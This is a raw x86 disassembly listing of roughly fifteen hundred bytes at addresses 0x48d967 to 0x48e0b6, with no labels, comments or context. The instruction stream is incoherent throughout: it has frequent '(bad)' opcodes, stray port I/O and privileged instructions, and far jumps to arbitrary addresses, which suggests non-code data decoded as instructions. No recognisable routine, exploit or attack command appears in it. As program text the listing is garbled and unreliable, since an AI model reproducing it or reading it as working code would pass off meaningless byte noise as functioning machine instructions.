  48d967:	mov    gs,WORD PTR [edx-0x4f91ab53]
  48d96d:	or     edx,DWORD PTR [ecx]
  48d96f:	je     0x48d996
  48d971:	ss inc edi
  48d973:	jmp    0xec7ae4d4
  48d978:	jl     0x48d985
  48d97a:	(bad)
  48d97d:	add    ebp,DWORD PTR ds:0x5795b052
  48d983:	in     al,dx
  48d984:	inc    ebx
  48d985:	ret    0x9378
  48d988:	jmp    0x9724:0x870f07ce
  48d98f:	iret   
  48d990:	rcl    DWORD PTR [esi],cl
  48d992:	loopne 0x48d986
  48d994:	jle    0x48d9da
  48d996:	adc    bh,BYTE PTR [edi+0x6]
  48d999:	cs dec edx
  48d99b:	imul   ebx,DWORD PTR [ecx-0x73c30c31],0xffffffbc
  48d9a2:	cmc    
  48d9a3:	add    DWORD PTR [eax-0x6eb594aa],eax
  48d9a9:	cdq    
  48d9aa:	cmp    DWORD PTR [eax],edx
  48d9ac:	rcl    cl,1
  48d9ae:	xor    eax,0x37dc848c
  48d9b3:	add    edi,DWORD PTR [esi-0x42e5efc8]
  48d9b9:	and    DWORD PTR [esi-0x5b],ecx
  48d9bc:	in     al,dx
  48d9bd:	mov    edx,0x414c1315
  48d9c2:	xor    eax,0x70bb9403
  48d9c7:	pop    edi
  48d9c8:	adc    bl,BYTE PTR [edi-0x7f]
  48d9cb:	js     0x48d9e1
  48d9cd:	cli    
  48d9ce:	jle    0x48d9e3
  48d9d0:	push   ebp
  48d9d1:	dec    ebp
  48d9d2:	or     ebp,0x4f5404f0
  48d9d8:	out    dx,eax
  48d9d9:	fs test al,0x9e
  48d9dc:	les    edi,FWORD PTR [eax+0x74]
  48d9df:	in     al,dx
  48d9e0:	push   edx
  48d9e1:	push   es
  48d9e2:	and    DWORD PTR [ebx+0x29],edx
  48d9e5:	sbb    eax,0x3242822a
  48d9ea:	shl    DWORD PTR [ecx+0x2b],1
  48d9ed:	mov    al,0x3f
  48d9ef:	(bad)  
  48d9f0:	pushf  
  48d9f1:	push   es
  48d9f2:	pop    ss
  48d9f3:	gs push eax
  48d9f5:	adc    al,0x1f
  48d9f7:	cld    
  48d9f8:	or     dl,cl
  48d9fa:	mov    WORD PTR [ebx+0x24533ba7],cs
  48da00:	mov    BYTE PTR [edi],0xd2
  48da03:	push   eax
  48da04:	dec    esi
  48da05:	ss jne 0x48da20
  48da08:	cdq    
  48da09:	add    BYTE PTR cs:[edi-0x26],al
  48da0d:	sbb    ah,dh
  48da0f:	test   al,0xc0
  48da11:	daa    
  48da12:	lea    esi,[ebp+0x57]
  48da15:	mov    dh,al
  48da17:	inc    edi
  48da18:	add    BYTE PTR [eax],dl
  48da1a:	inc    edx
  48da1b:	loopne 0x48d9da
  48da1d:	pop    ecx
  48da1e:	lahf   
  48da1f:	xor    al,0xee
  48da21:	ja     0x48da27
  48da23:	push   esp
  48da24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48da25:	or     al,0xd4
  48da27:	in     eax,dx
  48da28:	adc    edi,DWORD PTR [edi+0x28]
  48da2b:	je     0x48da40
  48da2d:	mov    DWORD PTR [eax],ecx
  48da2f:	mov    BYTE PTR [eax+0x2c],0xa2
  48da33:	lahf   
  48da34:	or     eax,0x404af220
  48da39:	jmp    FWORD PTR [edx+ebp*4]
  48da3c:	jo     0x48da3e
  48da3e:	add    DWORD PTR [esi+0x2c],ebp
  48da41:	mov    dl,0xa
  48da43:	sar    DWORD PTR [edx-0x79],0x6
  48da47:	mov    ch,0xfc
  48da49:	pop    eax
  48da4a:	popa   
  48da4b:	push   0x9c1f52e9
  48da50:	jmp    0x48da6d
  48da52:	pop    ds
  48da53:	fidiv  WORD PTR [esi]
  48da55:	enter  0x7132,0x49
  48da59:	rol    cl,cl
  48da5b:	push   eax
  48da5c:	outs   dx,DWORD PTR ds:[esi]
  48da5d:	stos   DWORD PTR es:[edi],eax
  48da5e:	jle    0x48da38
  48da60:	push   esp
  48da61:	add    DWORD PTR [eax],esi
  48da63:	cwde   
  48da64:	ins    BYTE PTR es:[edi],dx
  48da65:	retf   0xa1d2
  48da68:	adc    DWORD PTR [esi+0x27],0x67
  48da6c:	add    al,0xc2
  48da6e:	add    al,0xdd
  48da70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48da71:	mov    ebp,0xc3c2a08
  48da76:	je     0x48dac5
  48da78:	pop    edx
  48da79:	inc    eax
  48da7a:	or     BYTE PTR [ebx+eiz*8],ch
  48da7d:	das    
  48da7e:	push   cs
  48da7f:	pop    ds
  48da80:	jl     0x48da03
  48da82:	mov    bl,0x6e
  48da84:	or     eax,0xc8c61460
  48da89:	sub    ecx,edx
  48da8b:	sub    al,0x3d
  48da8d:	jnp    0x48db05
  48da8f:	sbb    ch,BYTE PTR [edi+ebx*1-0x45]
  48da93:	adc    BYTE PTR [ebp+ebx*1+0x27],dh
  48da97:	lahf   
  48da98:	es push ds
  48da9a:	sub    eax,0xbf80b8cc
  48da9f:	fimul  WORD PTR [edx+0x57fec220]
  48daa5:	or     DWORD PTR [ebp+0x58],0x15
  48daa9:	retf   0x91b2
  48daac:	jno    0x48dae9
  48daae:	ror    BYTE PTR [edx-0x1],cl
  48dab1:	mov    edx,DWORD PTR [ecx]
  48dab3:	jns    0x48daa2
  48dab5:	loopne 0x48db07
  48dab7:	cmp    ebx,DWORD PTR [ebx+esi*2+0x4f]
  48dabb:	and    ebx,DWORD PTR [ecx]
  48dabd:	xchg   edx,eax
  48dabe:	emms   
  48dac0:	xor    BYTE PTR [eax-0x6ff9a798],dh
  48dac6:	xor    BYTE PTR [eax],dh
  48dac8:	ds xor al,0xd0
  48dacb:	pusha  
  48dacc:	sub    cl,BYTE PTR [eax+0x4e]
  48dacf:	or     BYTE PTR [edi+0x24],ch
  48dad2:	aaa    
  48dad3:	mov    ch,0x89
  48dad5:	fisubr WORD PTR [esi]
  48dad7:	mov    DWORD PTR [eax+0x38],edx
  48dada:	icebp  
  48dadb:	dec    edx
  48dadc:	adc    DWORD PTR [eax],edi
  48dade:	mov    ecx,edx
  48dae0:	xor    BYTE PTR [ebp-0x72fa8237],al
  48dae6:	arpl   WORD PTR [esi+0x10],cx
  48dae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48daea:	xor    edx,DWORD PTR [eax+0x216139b0]
  48daf0:	jp     0x48dab8
  48daf2:	or     DWORD PTR [ebx+0x13011e62],0x838d7dc2
  48dafc:	ret    
  48dafd:	cmp    cl,BYTE PTR [edx-0x3b5dd880]
  48db03:	mov    al,0x9b
  48db05:	(bad)  
  48db06:	pop    eax
  48db07:	sbb    al,0x59
  48db09:	pop    edi
  48db0a:	test   DWORD PTR [ebp*4-0x33995ca],eax
  48db11:	out    0xa8,eax
  48db13:	test   ah,cl
  48db15:	(bad)  
  48db16:	nop
  48db17:	push   esp
  48db18:	xor    al,0x2
  48db1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48db1b:	dec    edi
  48db1c:	cmp    DWORD PTR [edx-0x20],edi
  48db1f:	sbb    ebx,DWORD PTR [eax]
  48db21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48db22:	add    edx,DWORD PTR [ecx-0x47dfa519]
  48db28:	pop    ss
  48db29:	add    dh,BYTE PTR [ecx]
  48db2b:	sub    bh,BYTE PTR [edx+0x16f8a822]
  48db31:	and    al,0xa
  48db33:	sub    DWORD PTR [ecx],edi
  48db35:	fsub   DWORD PTR [edi-0x7e]
  48db38:	arpl   WORD PTR [ecx+eiz*2],sp
  48db3b:	mov    esp,0x8643903
  48db40:	cmp    BYTE PTR [eax],bh
  48db42:	nop
  48db43:	inc    ebx
  48db44:	xchg   BYTE PTR [eax-0x56cfcf40],dl
  48db4a:	pop    ecx
  48db4b:	add    BYTE PTR [ecx],bh
  48db4d:	les    edx,FWORD PTR [ecx+0x28]
  48db50:	add    BYTE PTR [edx+0x2d],dh
  48db53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48db54:	stc    
  48db55:	pop    ebx
  48db56:	enter  0x918,0x58
  48db5a:	test   bh,ah
  48db5c:	femms  
  48db5e:	sbb    eax,0x8deb2218
  48db63:	xor    al,BYTE PTR [esi]
  48db65:	mov    bl,0xe
  48db67:	bsf    ebp,DWORD PTR [esp+edx*1-0x590f4420]
  48db6f:	lods   eax,DWORD PTR ds:[esi]
  48db70:	ret    0xbb9d
  48db73:	push   ss
  48db74:	out    0x24,al
  48db76:	mov    dl,BYTE PTR [eax-0x76]
  48db79:	push   cs
  48db7a:	inc    esp
  48db7b:	dec    edi
  48db7c:	sbb    dh,BYTE PTR gs:[edi+0x47a8b16]
  48db83:	push   eax
  48db84:	mov    edi,ebx
  48db86:	or     cl,BYTE PTR [ebp-0x57]
  48db89:	es inc eax
  48db8b:	pop    es
  48db8c:	jae    0x48db55
  48db8e:	inc    ebp
  48db8f:	fisubr WORD PTR [edx+0x5b]
  48db92:	clc    
  48db93:	or     BYTE PTR [ebx-0x1e],dl
  48db96:	pop    ss
  48db97:	arpl   WORD PTR [ebp-0x199f2cbf],bp
  48db9d:	xchg   edi,eax
  48db9e:	adc    al,0xa
  48dba0:	or     DWORD PTR [eax],edx
  48dba2:	push   ds
  48dba3:	jmp    0xea25:0x4a63d834
  48dbaa:	fwait
  48dbab:	adc    dh,BYTE PTR [edx]
  48dbad:	pop    ebp
  48dbae:	and    DWORD PTR [edx],0xffffffee
  48dbb1:	aas    
  48dbb2:	or     al,0x7e
  48dbb4:	or     ah,BYTE PTR [ebx+0x55f6a0b1]
  48dbba:	sbb    dh,ah
  48dbbc:	xor    dh,BYTE PTR [edx+0x8]
  48dbbf:	pop    ecx
  48dbc0:	lods   al,BYTE PTR ds:[esi]
  48dbc1:	pop    edx
  48dbc2:	(bad)
  48dbc6:	or     BYTE PTR [ebp-0x22fa9c4e],0x0
  48dbcd:	push   ss
  48dbce:	ret    
  48dbcf:	xchg   edi,eax
  48dbd0:	outs   dx,BYTE PTR ds:[esi]
  48dbd1:	add    al,0x68
  48dbd3:	mov    dl,0xcc
  48dbd5:	and    BYTE PTR [edx+0x42],dh
  48dbd8:	xchg   esp,eax
  48dbd9:	xor    al,0x64
  48dbdb:	retf   
  48dbdc:	add    DWORD PTR [eax],eax
  48dbde:	mov    WORD PTR [ebx-0x34fe3ffe],gs
  48dbe4:	add    DWORD PTR [edi+0x49],esp
  48dbe7:	into   
  48dbe8:	sbb    BYTE PTR [eax],cl
  48dbea:	sub    DWORD PTR [edx+0xa],esp
  48dbed:	jl     0x48dbf7
  48dbef:	and    ah,cl
  48dbf1:	mov    eax,0x1274c247
  48dbf6:	xchg   edx,eax
  48dbf7:	jg     0x48dbbb
  48dbf9:	adc    eax,0x32949a82
  48dbfe:	inc    edx
  48dbff:	adc    DWORD PTR [eax+0x18514849],0xffffffef
  48dc06:	adc    ecx,DWORD PTR [eax-0x5fdef08d]
  48dc0c:	test   BYTE PTR [edi+eax*2-0x27],al
  48dc10:	sar    BYTE PTR [edi],1
  48dc12:	and    edi,DWORD PTR ds:0x899c6804
  48dc18:	dec    eax
  48dc19:	cmp    BYTE PTR [ebx-0x25],al
  48dc1c:	outs   dx,DWORD PTR ds:[esi]
  48dc1d:	push   0x1
  48dc1f:	sub    ecx,DWORD PTR [ecx+esi*2]
  48dc22:	adc    eax,DWORD PTR [edx+0x2a]
  48dc25:	div    DWORD PTR [ebx+0x4]
  48dc28:	mov    ch,0x21
  48dc2a:	pop    ebx
  48dc2b:	ds pop es
  48dc2d:	or     al,0x55
  48dc2f:	sbb    edi,DWORD PTR [edx+0x10901d80]
  48dc35:	push   ss
  48dc36:	mov    ch,0x24
  48dc38:	inc    edi
  48dc39:	inc    ebx
  48dc3a:	add    BYTE PTR [ebp+0x75ad2f9a],cl
  48dc40:	and    al,0x42
  48dc42:	and    DWORD PTR [eax+eiz*1+0x1dc6ba37],0x32293d87
  48dc4d:	aaa    
  48dc4e:	mov    bh,0x2e
  48dc50:	adc    ebp,DWORD PTR [edx+0x40]
  48dc53:	pop    ebx
  48dc54:	pop    ss
  48dc55:	daa    
  48dc56:	(bad)  
  48dc57:	ret    
  48dc58:	inc    ecx
  48dc59:	jmp    0x2b9260d4
  48dc5e:	push   esp
  48dc5f:	xchg   ebp,eax
  48dc60:	mov    ah,0x9a
  48dc62:	data16 lahf 
  48dc64:	mov    al,ds:0x19d5125c
  48dc69:	or     dh,BYTE PTR [ebx-0x4ba20c58]
  48dc6f:	push   cs
  48dc70:	dec    edx
  48dc71:	(bad)  
  48dc72:	lock lahf 
  48dc74:	cmp    BYTE PTR [eax+0x78f05cfc],al
  48dc7a:	xchg   BYTE PTR [ebx+ecx*4-0x68],al
  48dc7e:	punpckhbw mm3,mm4
  48dc81:	xor    bh,ch
  48dc83:	inc    edi
  48dc84:	ficom  WORD PTR [ecx]
  48dc86:	or     edx,DWORD PTR [eax]
  48dc88:	push   ecx
  48dc89:	lods   al,BYTE PTR ds:[esi]
  48dc8a:	sbb    ebp,esi
  48dc8c:	jp     0x48dcd6
  48dc8e:	(bad)  
  48dc8f:	test   DWORD PTR [ebx],0x50602c0f
  48dc95:	push   eax
  48dc96:	or     dh,BYTE PTR [edi]
  48dc98:	imul   ebx,DWORD PTR [ecx+0x28],0x377ad110
  48dc9f:	inc    esi
  48dca0:	(bad)  
  48dca2:	jne    0x48dc75
  48dca4:	jb     0x48dc34
  48dca6:	std    
  48dca7:	lock mov al,ds:0xa02802b
  48dcad:	int3   
  48dcae:	ss or  eax,0x67099964
  48dcb4:	pop    ds
  48dcb5:	mov    ah,0x78
  48dcb7:	mov    eax,ds:0xfd22d68b
  48dcbc:	push   edx
  48dcbd:	in     al,0x78
  48dcbf:	mov    edx,0xe093d0d
  48dcc4:	test   eax,0x487c6904
  48dcc9:	repz jo 0x48dc4f
  48dccc:	inc    edi
  48dccd:	jg     0x48dc55
  48dccf:	inc    esp
  48dcd0:	lock or BYTE PTR [esi+0x26],dl
  48dcd4:	push   es
  48dcd5:	(bad)  
  48dcd6:	jnp    0x48dd43
  48dcd8:	push   0x69
  48dcda:	jnp    0x48dd5b
  48dcdc:	jl     0x48dc61
  48dcde:	jns    0x48dd4a
  48dce0:	mov    BYTE PTR [edi+esi*8],dl
  48dce3:	clc    
  48dce4:	and    cl,BYTE PTR [eax+0xc]
  48dce7:	ja     0x48dd23
  48dce9:	xchg   ebx,eax
  48dcea:	pop    edi
  48dceb:	je     0x48dd1a
  48dced:	mov    BYTE PTR [ebx],ah
  48dcef:	lods   al,BYTE PTR ds:[esi]
  48dcf0:	cmp    BYTE PTR [edx+0xf],bh
  48dcf3:	sbb    al,0x9
  48dcf5:	push   gs
  48dcf7:	xor    BYTE PTR [edi+eax*1+0x6d],0x6f
  48dcfc:	lock sbb DWORD PTR [eax+eax*4],ecx
  48dd00:	(bad)  
  48dd01:	dec    ebp
  48dd02:	mov    ds:0xf24a7747,al
  48dd07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48dd08:	test   BYTE PTR ds:0x8a8d0c1f,ah
  48dd0e:	adc    ecx,ecx
  48dd10:	addr16 fs sbb bh,dl
  48dd14:	inc    esp
  48dd15:	leave  
  48dd16:	in     al,dx
  48dd17:	jmp    0xcc0ab8a1
  48dd1c:	mov    edx,0x1e716c97
  48dd21:	inc    edi
  48dd22:	repz xchg esi,eax
  48dd25:	sbb    BYTE PTR [ebx+0x1],0x86
  48dd29:	nop
  48dd2a:	fimul  WORD PTR [esi]
  48dd2c:	in     eax,0xe1
  48dd2e:	ins    BYTE PTR es:[edi],dx
  48dd2f:	pushf  
  48dd30:	add    bl,bh
  48dd32:	rcl    edx,0x18
  48dd35:	or     edx,esi
  48dd37:	sub    dh,BYTE PTR [ebx+0x10]
  48dd3a:	fstp   TBYTE PTR [esi+0x56]
  48dd3d:	arpl   WORD PTR [edi+0xf],ax
  48dd40:	and    ebp,ebx
  48dd42:	pop    esp
  48dd43:	dec    ebx
  48dd44:	outs   dx,DWORD PTR ds:[esi]
  48dd45:	pop    es
  48dd46:	jb     0x48dd6c
  48dd48:	inc    ebx
  48dd49:	or     al,0x8
  48dd4b:	and    al,0x90
  48dd4d:	xor    BYTE PTR [edx+0x6b],ah
  48dd50:	xchg   edi,eax
  48dd51:	dec    ebx
  48dd52:	sub    eax,0x17143cb9
  48dd57:	cli    
  48dd58:	xchg   DWORD PTR [eax+ebx*1+0x4d],eax
  48dd5c:	aaa    
  48dd5d:	test   BYTE PTR [edi],ch
  48dd5f:	wrmsr  
  48dd61:	adc    DWORD PTR [ecx],eax
  48dd63:	mov    bh,0x74
  48dd65:	addr16 pop edx
  48dd67:	add    BYTE PTR [edx],cl
  48dd69:	cmp    al,0xd1
  48dd6b:	push   ecx
  48dd6c:	dec    ecx
  48dd6d:	sar    BYTE PTR [eax+0x2f],0xe0
  48dd71:	shl    DWORD PTR [esi],cl
  48dd73:	cmc    
  48dd74:	dec    ebp
  48dd75:	jecxz  0x48dd73
  48dd77:	scas   al,BYTE PTR es:[edi]
  48dd78:	xor    al,0x19
  48dd7a:	adc    bl,BYTE PTR [eax-0xe]
  48dd7d:	out    dx,eax
  48dd7e:	leave  
  48dd7f:	rcr    DWORD PTR [ecx+edx*1],cl
  48dd82:	aam    0x41
  48dd84:	dec    eax
  48dd85:	cmp    BYTE PTR [eax],cl
  48dd87:	and    BYTE PTR [edx+0x1dd732fd],ch
  48dd8d:	inc    edi
  48dd8e:	add    al,0x1e
  48dd90:	or     al,0x23
  48dd92:	popf   
  48dd93:	jge    0x48dd67
  48dd95:	sbb    bl,BYTE PTR [eax]
  48dd97:	js     0x48dd26
  48dd99:	push   esp
  48dd9a:	sbb    BYTE PTR [eax],ah
  48dd9c:	ja     0x48ddc3
  48dd9e:	cmp    al,BYTE PTR [eax+0x7644f500]
  48dda4:	addr16 pop edi
  48dda6:	push   es
  48dda7:	call   DWORD PTR [esi+0x51]
  48ddaa:	lea    edx,[edi+0x8]
  48ddad:	push   ebx
  48ddae:	sub    BYTE PTR [esi+0x55b82b77],0x1a
  48ddb5:	aaa    
  48ddb6:	loop   0x48ddca
  48ddb8:	pop    ecx
  48ddb9:	xchg   ebp,eax
  48ddba:	mov    esi,0xd6d8f112
  48ddbf:	mov    edi,0x7f1e0252
  48ddc4:	inc    ebx
  48ddc5:	out    0x6f,eax
  48ddc7:	or     BYTE PTR [ebx],bh
  48ddc9:	lds    esi,FWORD PTR [ebp+0x4f]
  48ddcc:	(bad)  
  48ddce:	jge    0x48de05
  48ddd0:	sbb    ebp,DWORD PTR [ebx]
  48ddd2:	out    dx,al
  48ddd3:	sbb    BYTE PTR [ebx+eax*1],cl
  48ddd6:	pop    es
  48ddd7:	mov    esi,DWORD PTR [ebx-0x1225da2d]
  48dddd:	jno    0x48de38
  48dddf:	push   esi
  48dde0:	jle    0x48de39
  48dde2:	mov    dh,0xc6
  48dde4:	dec    ebx
  48dde5:	cdq    
  48dde6:	nop
  48dde7:	cdq    
  48dde8:	sub    dh,BYTE PTR [edi+esi*4-0x4904bbf4]
  48ddef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ddf0:	sbb    DWORD PTR [eax-0x48e4c9f4],ebp
  48ddf6:	or     eax,0x4d348719
  48ddfb:	jo     0x48de00
  48ddfd:	xchg   BYTE PTR [eax+0x2a80c0c],bh
  48de03:	pop    eax
  48de04:	inc    ebx
  48de05:	cs or  al,0x99
  48de08:	push   esp
  48de09:	scas   al,BYTE PTR es:[edi]
  48de0a:	test   al,dl
  48de0c:	outs   dx,DWORD PTR ds:[esi]
  48de0d:	jns    0x48ddf7
  48de0f:	and    DWORD PTR [ebx+0x277d420b],esp
  48de15:	adc    al,0xd1
  48de17:	jnp    0x48de44
  48de19:	and    al,0xa1
  48de1b:	ss std 
  48de1d:	adc    edx,DWORD PTR [ebx+0x5e4b6499]
  48de23:	jo     0x48ddb1
  48de25:	sbb    BYTE PTR [ecx],ah
  48de27:	xor    eax,0x92510ab9
  48de2c:	stos   DWORD PTR es:[edi],eax
  48de2d:	inc    ecx
  48de2e:	fcomp  QWORD PTR [esi]
  48de30:	jo     0x48de9b
  48de32:	add    BYTE PTR [esi],cl
  48de34:	loopne 0x48deaa
  48de36:	adc    BYTE PTR [esi+0x34],dh
  48de39:	push   esp
  48de3a:	adc    dl,BYTE PTR [ecx+0x433ee5c5]
  48de40:	xchg   BYTE PTR ds:0xed0c92,ah
  48de46:	add    dh,BYTE PTR [ebp+ebp*1+0x1]
  48de4a:	adc    DWORD PTR [eax-0x20fba7fb],0xffffffc6
  48de51:	jns    0x48debb
  48de53:	push   esp
  48de54:	add    al,al
  48de56:	repnz pop edi
  48de58:	push   0xb281f2d7
  48de5d:	cmp    bh,bh
  48de5f:	xor    BYTE PTR [ebx-0x3a],0xa2
  48de63:	mov    ch,BYTE PTR [ebx+0x13]
  48de66:	xchg   DWORD PTR [ebx-0x47],ebp
  48de69:	dec    edx
  48de6a:	dec    eax
  48de6b:	(bad)  
  48de6c:	je     0x48de03
  48de6e:	aaa    
  48de6f:	lea    eax,[ecx+edi*4]
  48de72:	pop    edx
  48de73:	dec    edx
  48de74:	je     0x48de80
  48de76:	add    ebx,DWORD PTR [eax+0x66989802]
  48de7c:	push   es
  48de7d:	outs   dx,BYTE PTR ds:[esi]
  48de7e:	leave  
  48de7f:	dec    ebx
  48de80:	dec    ecx
  48de81:	add    DWORD PTR [edx],0x1e
  48de84:	pop    ecx
  48de85:	rcl    BYTE PTR [ebp+eiz*4-0x7756888c],1
  48de8c:	stos   DWORD PTR es:[edi],eax
  48de8d:	mov    BYTE PTR [ebx+ebp*4+0x4d],ah
  48de91:	jmp    0xe150b597
  48de96:	mov    dl,BYTE PTR [eax+0x1b5f447]
  48de9c:	fucomi st,st(0)
  48de9e:	mov    bh,BYTE PTR [ebx-0x7b]
  48dea1:	xor    DWORD PTR ds:0xf75603d,eax
  48dea7:	sbb    eax,0xe4d490e0
  48deac:	or     al,0x39
  48deae:	and    eax,0xc25ac8ea
  48deb3:	pmaxub mm2,QWORD PTR [edi+0x21]
  48deb7:	call   0x5dd1354e
  48debc:	jns    0x48defc
  48debe:	or     al,0xc3
  48dec0:	out    dx,al
  48dec1:	lock test al,0x47
  48dec4:	ins    DWORD PTR es:[edi],dx
  48dec5:	adc    al,0xf
  48dec7:	inc    edi
  48dec8:	loopne 0x48de8d
  48deca:	inc    edi
  48decb:	or     al,0x96
  48decd:	or     eax,0x480c25c8
  48ded2:	hlt    
  48ded3:	pop    ds
  48ded4:	jae    0x48de82
  48ded6:	inc    ecx
  48ded7:	div    DWORD PTR ds:0x48724f93
  48dedd:	jb     0x48deb3
  48dedf:	push   edx
  48dee0:	adc    BYTE PTR [ebx],bl
  48dee2:	xchg   ebp,eax
  48dee3:	out    0xa4,al
  48dee5:	test   BYTE PTR [ebx+0x4735d025],cl
  48deeb:	push   0xfffffff6
  48deed:	mov    dh,cl
  48deef:	cmp    DWORD PTR [ebx-0x2508e238],ecx
  48def5:	sub    BYTE PTR [eax],cl
  48def7:	fadd   DWORD PTR [edx-0x2ee6e00e]
  48defd:	mov    edi,esi
  48deff:	lea    esi,[esp+0x4]
  48df03:	adc    al,0x80
  48df05:	adc    BYTE PTR [ebx-0x57],dl
  48df08:	xchg   ebp,eax
  48df09:	fwait
  48df0a:	push   edx
  48df0b:	pusha  
  48df0c:	out    dx,eax
  48df0d:	cmp    ecx,ecx
  48df0f:	xchg   DWORD PTR [edi+0x5a70c10e],eax
  48df15:	sub    eax,0x40983b8c
  48df1a:	pusha  
  48df1b:	fisttp QWORD PTR [edx]
  48df1d:	push   eax
  48df1e:	xchg   ecx,eax
  48df1f:	rcl    BYTE PTR [eax-0x46b83834],cl
  48df25:	cmp    ebp,DWORD PTR [esi+0x4d]
  48df28:	gs push edi
  48df2a:	xchg   ebp,eax
  48df2b:	xor    al,0x72
  48df2d:	xchg   ebp,eax
  48df2e:	aam    0x2a
  48df30:	sahf   
  48df31:	or     eax,0x18150418
  48df36:	adc    al,0xb8
  48df38:	add    bl,BYTE PTR [ecx]
  48df3a:	push   ss
  48df3b:	xlat   BYTE PTR ds:[ebx]
  48df3c:	rol    dh,1
  48df3e:	add    ah,BYTE PTR [ecx-0x71]
  48df41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48df42:	pop    esp
  48df43:	and    eax,0x88e71580
  48df48:	popf   
  48df49:	adc    eax,esp
  48df4b:	adc    DWORD PTR [ebx],eax
  48df4d:	pop    ss
  48df4e:	jg     0x48df29
  48df50:	mov    bh,0xc6
  48df52:	sbb    DWORD PTR [edi],eax
  48df54:	fld    DWORD PTR [ecx-0x40]
  48df57:	lea    esp,[ecx-0x2739699c]
  48df5d:	xor    DWORD PTR [ebx-0x19],ecx
  48df60:	mov    al,ds:0x3a75b233
  48df65:	leave  
  48df66:	and    BYTE PTR [eax],bl
  48df68:	dec    ecx
  48df69:	pop    ecx
  48df6a:	add    DWORD PTR [eax-0x785b6615],edi
  48df70:	mov    WORD PTR [ebx+0x66660537],cs
  48df76:	or     BYTE PTR [eax-0x7e],bh
  48df79:	fnstenv [edi]
  48df7b:	enter  0xf8e1,0xf2
  48df7f:	test   DWORD PTR [edx+0x65f48880],ebp
  48df85:	push   0x243f198d
  48df8a:	ja     0x48dfa1
  48df8c:	popa   
  48df8d:	(bad)  
  48df8e:	das    
  48df8f:	jp     0x48df25
  48df91:	mov    al,ds:0x494a0847
  48df96:	add    BYTE PTR [edi+0x1f450a0e],dh
  48df9c:	sub    ebx,DWORD PTR [ebx+0x38]
  48df9f:	mov    dh,0x97
  48dfa1:	or     al,cl
  48dfa3:	inc    bx
  48dfa5:	pop    edx
  48dfa6:	pop    ss
  48dfa7:	in     al,dx
  48dfa8:	(bad)  
  48dfa9:	js     0x48e01c
  48dfab:	inc    esp
  48dfac:	inc    ecx
  48dfad:	sbb    ch,BYTE PTR [esi]
  48dfaf:	pop    ds
  48dfb0:	jge    0x48df49
  48dfb2:	cmp    al,0x3f
  48dfb4:	jp     0x48e025
  48dfb6:	lea    ecx,ds:0xfef4a080
  48dfbc:	sub    BYTE PTR [edi-0x47391adf],0x34
  48dfc3:	fnstenv [ecx-0x2c]
  48dfc6:	(bad)  ds:0x6aa725dc
  48dfcc:	add    eax,0x80116f18
  48dfd1:	int3   
  48dfd2:	mov    cl,0xec
  48dfd4:	inc    ecx
  48dfd5:	(bad)  
  48dfd6:	test   al,0xd
  48dfd8:	test   DWORD PTR [eax+edi*8+0x35cf3dec],esp
  48dfdf:	bound  ecx,QWORD PTR [ebp-0x3e0c85a1]
  48dfe5:	popa   
  48dfe6:	arpl   WORD PTR [edx],dx
  48dfe8:	je     0x48dfdb
  48dfea:	test   BYTE PTR [ebx+0x4a5c8d3d],0xb8
  48dff1:	and    BYTE PTR [edx+edx*1-0x74],dh
  48dff5:	mov    bl,0xa3
  48dff7:	lahf   
  48dff8:	stos   BYTE PTR es:[edi],al
  48dff9:	xchg   esp,eax
  48dffa:	shl    DWORD PTR [edi],1
  48dffc:	ffreep st(7)
  48dffe:	add    al,0x74
  48e000:	sub    BYTE PTR [ecx-0x7b77d777],ah
  48e006:	xchg   esp,eax
  48e007:	cwde   
  48e008:	test   BYTE PTR [esi],al
  48e00a:	push   cs
  48e00b:	jnp    0x48dfee
  48e00d:	and    DWORD PTR [eax+0x11],esp
  48e010:	hlt    
  48e011:	mov    edx,0xb7fc8349
  48e016:	fcom   QWORD PTR [edi]
  48e018:	hlt    
  48e019:	sbb    al,0xba
  48e01b:	lock add BYTE PTR [eax-0x77],al
  48e01f:	out    0xe6,eax
  48e021:	or     bl,BYTE PTR [edx]
  48e023:	push   0xb0241be
  48e028:	xor    al,0x40
  48e02a:	enter  0x1a44,0xf4
  48e02e:	cmp    BYTE PTR [ecx],dh
  48e030:	das    
  48e031:	(bad)  
  48e032:	mov    ecx,0x6ac59d81
  48e037:	xor    ah,BYTE PTR [edi]
  48e039:	or     DWORD PTR [ebp+0x2f],0x34
  48e03d:	adc    eax,0x50c99162
  48e042:	jo     0x48e0b0
  48e044:	adc    BYTE PTR [esi+ebp*1+0xa],cl
  48e048:	dec    ecx
  48e049:	add    dl,BYTE PTR [ebx+edi*4-0x3effefc8]
  48e050:	dec    ebx
  48e051:	mov    al,ds:0xa3b43c98
  48e056:	cmc    
  48e057:	sub    al,0x4c
  48e059:	sub    BYTE PTR [edx],al
  48e05b:	sub    DWORD PTR [eax+0xc],edi
  48e05e:	sub    eax,DWORD PTR [eax+0x1aef3cd2]
  48e064:	xor    DWORD PTR [ebx],eax
  48e066:	inc    esp
  48e067:	jnp    0x48e06d
  48e069:	add    BYTE PTR [esi+0x5c836407],al
  48e06f:	push   ebx
  48e070:	push   ds
  48e071:	mov    ebx,0x135e120
  48e076:	mov    esp,0xd7cea5ee
  48e07b:	es mov eax,0x8316e15f
  48e081:	in     al,dx
  48e082:	adc    bl,ah
  48e084:	in     al,0xd9
  48e086:	or     edi,edi
  48e088:	mov    ch,BYTE PTR [ecx+edx*1-0x2db01fe]
  48e08f:	enter  0x4a2d,0x2c
  48e093:	jmp    0x420:0x21705bdd
  48e09a:	mov    ch,0xd1
  48e09c:	push   esi
  48e09d:	and    esp,0x6a
  48e0a0:	push   eax
  48e0a1:	inc    ebp
  48e0a2:	loope  0x48e030
  48e0a4:	lods   al,BYTE PTR ds:[esi]
  48e0a5:	xchg   ebx,eax
  48e0a6:	aam    0xc6
  48e0a8:	imul   ebp,DWORD PTR [edx],0x5f
  48e0ab:	stos   DWORD PTR es:[edi],eax
  48e0ac:	prefetchnta BYTE PTR [ecx+0x1dde8849]
  48e0b3:	ss cs dec eax
  48e0b6:	ins    BYTE PTR es:[edi],dx
